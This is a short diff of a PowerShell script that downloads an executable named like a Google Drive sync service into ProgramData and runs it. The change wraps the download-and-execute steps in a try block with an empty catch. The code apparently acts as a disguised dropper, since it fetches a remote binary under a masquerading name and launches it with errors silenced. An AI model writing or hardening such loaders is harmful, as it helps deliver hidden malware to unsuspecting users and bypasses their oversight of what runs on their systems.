@@ -14,10 +14,12 @@ $sourceFileName = "GDriveSyncSvc.exe"
 $destinationFolder = "$env:ProgramData\GDriveSync" 
 $destinationFilePath = Join-Path -Path $destinationFolder -ChildPath $sourceFileName
 
-if (-Not (Test-Path -Path $destinationFolder)) {
-    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
-}
-if (-Not (Test-Path -Path $destinationFilePath)) {
-    Invoke-WebRequest -Uri $File2Url -OutFile $destinationFilePath
-}
-Start-Process -FilePath $destinationFilePath
+try{
+   if (-Not (Test-Path -Path $destinationFolder)) {
+       New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
+   }
+   if (-Not (Test-Path -Path $destinationFilePath)) {
+       Invoke-WebRequest -Uri $File2Url -OutFile $destinationFilePath -ErrorAction Stop
+   }
+   Start-Process -FilePath $destinationFilePath
+} catch{}
